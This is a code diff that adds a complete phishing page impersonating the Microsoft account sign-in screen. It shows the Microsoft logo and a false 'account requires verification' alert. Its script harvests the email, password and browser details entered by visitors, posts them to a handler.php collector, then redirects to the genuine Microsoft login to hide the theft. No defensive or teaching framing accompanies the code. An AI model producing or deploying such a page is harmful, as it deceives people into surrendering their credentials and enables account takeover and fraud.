@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Account | Sign In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 440px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-text {
+            font-size: 21px;
+            font-weight: 600;
+            color: #5e5e5e;
+        }
+        .ms-icon {
+            display: inline-block;
+            width: 108px;
+            height: 24px;
+            margin-bottom: 10px;
+        }
+        .card {
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,.2);
+            padding: 44px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+        .alert {
+            background: #fff4ce;
+            border: 1px solid #d83b01;
+            padding: 12px 16px;
+            margin-bottom: 24px;
+            border-radius: 2px;
+            font-size: 13px;
+        }
+        input {
+            width: 100%;
+            height: 41px;
+            padding: 6px 10px;
+            border: 1px solid #8c8c8c;
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0067b8;
+        }
+        input:focus::placeholder {
+            color: transparent;
+        }
+        .btn {
+            width: 100%;
+            height: 41px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #005a9e;
+        }
+        .options {
+            margin-top: 16px;
+            font-size: 13px;
+        }
+        .options a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg class="ms-icon" viewBox="0 0 108 24">
+                <path fill="#f35022" d="M0 0h10.8v10.8H0z"/>
+                <path fill="#81bc06" d="M12 0h10.8v10.8H12z"/>
+                <path fill="#05a6f0" d="M0 12h10.8v10.8H0z"/>
+                <path fill="#ffba08" d="M12 12h10.8v10.8H12z"/>
+                <path fill="#737373" d="M32.42 5.58v12.82h-2.26V5.58h2.26zm5.99 0c2.13 0 3.44 1.25 3.44 3.23v6.36c0 1.98-1.31 3.23-3.44 3.23-2.13 0-3.44-1.25-3.44-3.23V8.81c0-1.98 1.31-3.23 3.44-3.23zm1.18 3.23c0-.76-.49-1.25-1.18-1.25s-1.18.49-1.18 1.25v6.36c0 .76.49 1.25 1.18 1.25s1.18-.49 1.18-1.25V8.81zm8.23-3.23c2.13 0 3.44 1.25 3.44 3.23v.52h-2.26v-.52c0-.76-.49-1.25-1.18-1.25s-1.18.49-1.18 1.25c0 1.67 4.62 1.95 4.62 5.48 0 1.98-1.31 3.23-3.44 3.23-2.13 0-3.44-1.25-3.44-3.23v-.91h2.26v.91c0 .76.49 1.25 1.18 1.25s1.18-.49 1.18-1.25c0-1.67-4.62-1.95-4.62-5.48 0-1.98 1.31-3.23 3.44-3.23zm8.09 0c2.13 0 3.44 1.25 3.44 3.23v6.36c0 1.98-1.31 3.23-3.44 3.23-2.13 0-3.44-1.25-3.44-3.23V8.81c0-1.98 1.31-3.23 3.44-3.23zm1.18 3.23c0-.76-.49-1.25-1.18-1.25s-1.18.49-1.18 1.25v6.36c0 .76.49 1.25 1.18 1.25s1.18-.49 1.18-1.25V8.81zm7.12-3.23c.82 0 1.52.25 2.1.73v-.59h2.26v12.82h-2.26v-.59c-.58.48-1.28.73-2.1.73-1.79 0-2.95-1.25-2.95-3.23V8.81c0-1.98 1.16-3.23 2.95-3.23zm.52 11.08c.67 0 1.18-.49 1.18-1.25V8.81c0-.76-.51-1.25-1.18-1.25-.67 0-1.18.49-1.18 1.25v6.36c0 .76.51 1.25 1.18 1.25zm10.99-8.62h-1.98v8.36h-2.26V7.24h-1.98V5.58h6.22v1.66zm3.08-1.66c2.13 0 3.44 1.25 3.44 3.23v6.36c0 1.98-1.31 3.23-3.44 3.23-2.13 0-3.44-1.25-3.44-3.23V8.81c0-1.98 1.31-3.23 3.44-3.23zm1.18 3.23c0-.76-.49-1.25-1.18-1.25s-1.18.49-1.18 1.25v6.36c0 .76.49 1.25 1.18 1.25s1.18-.49 1.18-1.25V8.81z"/>
+            </svg>
+        </div>
+
+        <div class="card">
+            <h1>Sign in</h1>
+
+            <div class="alert">
+                ⚠ Your account requires verification for security purposes.
+            </div>
+
+            <form id="signinForm" onsubmit="return handleSubmit(event)">
+                <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+                <input type="password" id="password" placeholder="Password" required>
+                
+                <button type="submit" class="btn">Sign in</button>
+                
+                <div class="options">
+                    <a href="#">Can't access your account?</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const data = {
+                type: 'microsoft_credentials',
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height
+            };
+            
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                const btn = document.querySelector('.btn');
+                btn.textContent = 'Signing in...';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://login.microsoftonline.com';
+                }, 1500);
+            });
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
